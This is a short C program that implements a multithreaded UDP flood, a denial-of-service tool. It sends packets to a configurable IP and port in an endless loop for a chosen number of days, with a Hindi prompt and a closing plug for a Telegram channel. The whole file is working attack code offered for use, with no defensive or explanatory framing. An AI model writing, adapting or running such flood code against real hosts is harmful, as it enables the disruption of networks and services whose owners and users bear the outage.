#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

void *udp_flood(void *args) {
    char *ip = (char *)args;
    int port = 8080; // Replace with the desired port
    int sock;
    struct sockaddr_in target_addr;
    char packet[64];

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    memset(packet, 'A', sizeof(packet)); // Sample packet data

    // Send packets
    while (1) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sock);
    return NULL;
}

int main() {
    int days;
    
    // Ask the user for the number of days
    printf("Kitne dino ke liye binary banana hai? (1-10): ");
    scanf("%d", &days);

    // Validate input
    if (days < 1 || days > 10) {
        printf("Invalid input. Please enter a number between 1 and 10.\n");
        return 1;
    }

    printf("Binary will run for %d days.\n", days);
    
    // Convert days to seconds
    int duration = days * 24 * 60 * 60; // Total seconds for the specified days

    // Here, add your UDP flood code. For example:
    char ip[] = "127.0.0.1"; // Use the desired IP address
    pthread_t flood_thread;

    // Create the UDP flood thread
    pthread_create(&flood_thread, NULL, udp_flood, (void *)ip);

    // Run the flood for the specified duration
    sleep(duration);

    // Optionally, you can implement logic to stop the flooding here
    pthread_cancel(flood_thread); // Stop the thread after the duration
    printf("Flooding completed after %d days.\n", days);
    
    // Thank you message
    printf("Thank You For Choosing @CreativeYdv Channel On TG.\n");
    
    return 0;
}
